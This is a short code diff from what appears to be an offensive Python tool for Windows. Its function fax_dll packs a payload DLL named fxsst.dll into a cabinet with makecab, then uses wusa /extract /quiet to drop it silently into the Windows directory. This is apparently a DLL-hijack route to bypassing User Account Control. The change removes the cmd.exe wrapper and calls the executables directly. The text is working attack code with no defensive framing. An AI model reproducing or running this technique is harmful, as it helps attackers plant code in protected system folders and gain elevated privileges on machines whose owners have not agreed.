@@ -35,7 +35,7 @@ def fax_dll(payload):
 		time.sleep(5)
 
 		if os.path.isfile(os.path.join(tempfile.gettempdir(), "fxsst.dll")) == True:
-			if process().create("cmd.exe /c makecab {} {}".format(
+			if process().create("makecab.exe", params="{} {}".format(
 					os.path.join(tempfile.gettempdir(), "fxsst.dll"),
 					os.path.join(tempfile.gettempdir(), "suspicious.cab")), 0) == True:
 				print_success("Successfully created cabinet file")
@@ -49,7 +49,7 @@ def fax_dll(payload):
 		time.sleep(5)
 
 		if (os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True):
-			if process().create("cmd.exe /c wusa {} /extract:{} /quiet".format(
+			if process().create("wusa.exe", params="{} /extract:{} /quiet".format(
 					os.path.join(tempfile.gettempdir(), "suspicious.cab"),
 					information().windows_directory()),0) == True:
 				print_success("Successfully extracted cabinet file")
